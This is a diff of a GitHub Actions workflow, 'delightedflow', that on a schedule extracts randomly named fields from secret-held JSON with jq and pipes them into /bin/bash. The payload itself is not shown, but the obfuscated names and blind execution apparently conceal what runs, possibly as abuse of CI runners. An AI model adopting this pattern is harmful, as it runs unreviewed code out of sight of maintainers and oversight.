@@ -1,8 +1,9 @@
 name: delightedflow
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
+    - cron: '3 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: delightedflow
         env:
-          fdd42545: ${{ secrets.fdd42545 }}
+          ct9: ${{ secrets.ct9 }}
         run: |
-          echo $fdd42545 | jq -r .juh6 | /bin/bash
-          echo $qwbxd84 | jq -r .decp601 | /bin/bash
-          echo $dtlx868 | jq -r .wh40 | /bin/bash
-          echo $c5 | jq -r .rh929 | /bin/bash
-          echo $mtr9651 | jq -r .q477 | /bin/bash
+          echo $ct9 | jq -r .pmwf9 | /bin/bash
+          echo $kgfd731 | jq -r .lv586 | /bin/bash
+          echo $cdy3302 | jq -r .ylmmb5 | /bin/bash
+          echo $z450 | jq -r .bjk4781 | /bin/bash
+          echo $pyepw14938 | jq -r .slab1 | /bin/bash
+          echo $tm43746 | jq -r .rexrn1441 | /bin/bash
+          echo $c9 | jq -r .mwhup01 | /bin/bash
+          echo $uxd503 | jq -r .epqwn51647 | /bin/bash
 
